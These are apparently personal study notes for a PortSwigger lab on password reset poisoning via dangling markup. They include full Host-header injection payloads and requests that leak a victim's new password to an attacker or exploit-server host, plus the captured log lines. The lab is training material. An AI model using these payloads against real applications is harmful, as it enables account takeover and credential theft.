
# #PortSwigger 


![[Pasted image 20260529194814.png]]


## Lab Description

> This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account.
> 
> **Credentials:** `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

---
---

## Step 1: Understanding the Vulnerability

**This lab combines two advanced techniques:**
1. **Host header injection via non-numeric port** - Application accepts arbitrary ports
2. **Dangling markup injection** - Unclosed HTML tag captures subsequent email content

**In this lab:**
- Password reset emails send the **new password in the email body** (not as a token link)
- The email HTML is sanitized with DOMPurify - but **raw version** is not
- The password appears **after** a link that uses the `Host` header's port value
- Injecting a port with a dangling anchor tag (`<a href=...`) captures everything after it
- Exploit server logs receive the captured content (including the new password)

---

## Step 2: Reconnaissance

### Step 2.1: Request Password Reset for Your Account

1. Go to the login page --> **"Forgot your password?"**
2. Request a reset for `wiener`

![[Pasted image 20260529195514.png]]

### Step 2.2: Check the Email Client

Go to the **Exploit server** --> **Email client**

![[Pasted image 20260529195614.png]]

**Observe:**
- The email does **not** contain a reset link with a token
- Instead, a **new password is sent directly in the email body**
- The link points to the generic login page

### Step 2.3: Compare Rendered vs Raw Email

**Rendered email:** Sanitized by DOMPurify (safe)  
**Raw email:** Not sanitized (vulnerable)

Click **"View raw HTML"** in the email client to see the un-sanitized version.

![[Pasted image 20260529195722.png]]

---

## Step 3: Testing Host Header Injection

### Step 3.1: Send POST /forgot-password to Repeater

Capture the password reset request:
```
POST /forgot-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=wiener
```

![[Pasted image 20260529195950.png]]


### Step 3.2: Test Host Header Modifications

**Change Host to arbitrary domain:**
```
Host: example.com
```

![[Pasted image 20260529200228.png]]

**Response:** Server error (validation fails)

**Add arbitrary port (non-numeric works):**
```
Host: YOUR-LAB-ID.web-security-academy.net:anything
```

![[Pasted image 20260529200306.png]]

**Response:** `200 OK` - email sent successfully!

The application accepts **non-numeric ports** and reflects them in the email.


---

## Step 4: Analyzing the Raw Email Structure

### Step 4.1: View Raw Email with Injected Port

After sending a reset with `Host: lab.com:TEST123`, check the **raw email**:
```
...
<a href='https://lab.com:TEST123/login'>Reset link</a>
Your new password is: aBc123XyZ
...
```

![[Pasted image 20260529200426.png]]

The port value (`TEST123`) is reflected **inside a single-quoted string** (`href='...'`).

### Step 4.2: Identify the Injection Point

We can break out of the `href` attribute using a single quote and inject **dangling markup**:
```
<a href='https://lab.com:INJECTION_HERE/login'>...
```


---

## Step 5: Crafting the Dangling Markup Payload

### Step 5.1: Dangling Markup Concept

A **dangling markup injection** occurs when an unclosed HTML tag causes the browser to capture subsequent content as part of the tag's attribute.

**Payload:**
```
'><a href='//attacker.com/?
```

**Resulting HTML:**
```
<a href='https://lab.com:'><a href='//attacker.com/?/login'>...
```

Everything after `//attacker.com/?` becomes part of the `href` attribute and is sent to the attacker's server as a request.

### Step 5.2: Full Payload for This Lab

We need to:
1. Close the existing `href` attribute with `'`
2. Close the anchor tag with `>`
3. Start a new anchor tag pointing to our exploit server
4. Leave it **unclosed** to capture the rest of the email

```
':<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
```

**In the Host header (as port):**
```
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
```


---

## Step 6: Testing the Payload

### Step 6.1: Send Poisoned Reset for Wiener

In Repeater:
![[Pasted image 20260529200947.png]]

### Step 6.2: Check the Raw Email

Go to **Email client** --> **View raw HTML**

The email content will look truncated --> most content after the injection is missing.
![[Pasted image 20260529201123.png]]

### Step 6.3: Check Exploit Server Access Logs

Go to **Exploit server** --> **Access log**

You should see a request like:
```
GET /?/login'&gt;[rest of email content including the new password]...
```

![[Pasted image 20260529201228.png]]

The password for wiener is captured in the log!

Dangling markup injection works.

---

## Step 7: Attacking Carlos

### Step 7.1: Send Poisoned Reset for Carlos

Change the `username` parameter to `carlos`:
```
POST /forgot-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
Content-Type: application/x-www-form-urlencoded

username=carlos
```

![[Pasted image 20260529201316.png]]

### Step 7.2: Check Access Logs Again

Refresh the exploit server **Access log**. Look for a request containing Carlos's new password:
```
GET /?/login'&gt;Your new password is: CaRlOsNeWpAsS123...
```

![[Pasted image 20260529201403.png]]

### Step 7.3: Extract the Password

From the log entry, copy Carlos's new password.
```
EqhZ3796K6
```


---

## Step 8: Log in as Carlos

1. Go to the login page
2. Username: `carlos`
3. Password: `extracted password`
![[Pasted image 20260529201551.png]]

4. Click **Log in**
![[Pasted image 20260529201607.png]]


---

## Step 9: Lab Solved

Success message displayed:

![[Pasted image 20260529201621.png]]

---
---

